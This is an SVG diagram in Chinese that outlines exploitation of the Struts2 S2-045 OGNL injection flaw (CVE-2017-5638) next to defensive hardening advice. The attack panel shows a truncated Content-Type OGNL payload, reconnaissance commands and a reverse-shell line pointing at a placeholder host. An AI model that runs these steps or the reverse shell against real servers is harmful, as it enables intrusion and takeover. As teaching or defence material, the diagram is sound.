<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 480" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <rect width="1000" height="480" fill="#f8fafc"/>
  <text x="500" y="30" font-size="16" font-weight="bold" text-anchor="middle" fill="#1a202c">Struts2 S2-045 OGNL 注入 RCE</text>

  <rect x="40" y="70" width="140" height="50" rx="8" fill="#fed7d7" stroke="#c53030" stroke-width="2"/>
  <text x="110" y="102" font-size="11" text-anchor="middle" fill="#c53030" font-weight="bold">① 发现 Struts2</text>

  <rect x="200" y="70" width="140" height="50" rx="8" fill="#fefcbf" stroke="#b7791f" stroke-width="2"/>
  <text x="270" y="102" font-size="11" text-anchor="middle" fill="#b7791f" font-weight="bold">② 确认版本</text>

  <rect x="360" y="70" width="140" height="50" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="2"/>
  <text x="430" y="102" font-size="11" text-anchor="middle" fill="#805ad5" font-weight="bold">③ Content-Type</text>

  <rect x="520" y="70" width="140" height="50" rx="8" fill="#c6f6d5" stroke="#38a169" stroke-width="2"/>
  <text x="590" y="102" font-size="11" text-anchor="middle" fill="#38a169" font-weight="bold">④ OGNL 执行</text>

  <rect x="680" y="70" width="140" height="50" rx="8" fill="#bee3f8" stroke="#3182ce" stroke-width="2"/>
  <text x="750" y="102" font-size="11" text-anchor="middle" fill="#3182ce" font-weight="bold">⑤ 反弹 Shell</text>

  <rect x="840" y="70" width="120" height="50" rx="8" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="900" y="102" font-size="11" text-anchor="middle" fill="#276749" font-weight="bold">⑥ 持久化</text>

  <rect x="40" y="150" width="460" height="300" rx="12" fill="#fff5f5" stroke="#e53e3e" stroke-width="2"/>
  <text x="270" y="175" font-size="12" font-weight="bold" text-anchor="middle" fill="#822727">S2-045 利用步骤</text>

  <text x="70" y="205" font-size="10" font-weight="bold" fill="#c53030">CVE-2017-5638：</text>
  <text x="70" y="225" font-size="9" fill="#2d3748">影响：Struts 2.3.x / 2.5.0~2.5.10</text>
  <text x="70" y="245" font-size="9" fill="#2d3748">入口：Content-Type header</text>

  <text x="70" y="275" font-size="10" font-weight="bold" fill="#805ad5">POC：</text>
  <text x="70" y="295" font-size="9" fill="#2d3748">Content-Type: %{#a=(new java.lang.String...)...}</text>

  <text x="70" y="325" font-size="10" font-weight="bold" fill="#dd6b20">执行命令：</text>
  <text x="70" y="345" font-size="9" fill="#2d3748">whoami · id · uname -a</text>

  <text x="70" y="375" font-size="10" font-weight="bold" fill="#3182ce">反弹 Shell：</text>
  <text x="70" y="395" font-size="9" fill="#2d3748">bash -i &gt;&amp; /dev/tcp/xxx/4444</text>

  <text x="70" y="425" font-size="10" font-weight="bold" fill="#38a169">工具：</text>
  <text x="70" y="445" font-size="9" fill="#2d3748">S2-045 专用 EXP 工具</text>
  <text x="70" y="465" font-size="9" fill="#2d3748">metasploit · nuclei</text>

  <rect x="520" y="150" width="440" height="300" rx="12" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="740" y="175" font-size="12" font-weight="bold" text-anchor="middle" fill="#276749">防御加固</text>

  <text x="550" y="205" font-size="10" font-weight="bold" fill="#c53030">升级版本：</text>
  <text x="550" y="225" font-size="9" fill="#2d3748">升级到 Struts 2.5.11+</text>
  <text x="550" y="245" font-size="9" fill="#2d3748">或使用 Struts 2.3.32+</text>

  <text x="550" y="275" font-size="10" font-weight="bold" fill="#805ad5">WAF 防护：</text>
  <text x="550" y="295" font-size="9" fill="#2d3748">拦截 Content-Type 异常值</text>
  <text x="550" y="315" font-size="9" fill="#2d3748">检测 %{...} OGNL payload</text>

  <text x="550" y="345" font-size="10" font-weight="bold" fill="#dd6b20">网络隔离：</text>
  <text x="550" y="365" font-size="9" fill="#2d3748">限制 Struts2 应用公网访问</text>
  <text x="550" y="385" font-size="9" fill="#2d3748">VPN / 堡垒机访问</text>

  <text x="550" y="415" font-size="10" font-weight="bold" fill="#3182ce">监控：</text>
  <text x="550" y="435" font-size="9" fill="#2d3748">监控 500 错误 · 异常响应</text>
  <text x="550" y="455" font-size="9" fill="#2d3748">检测异常命令执行</text>
</svg>
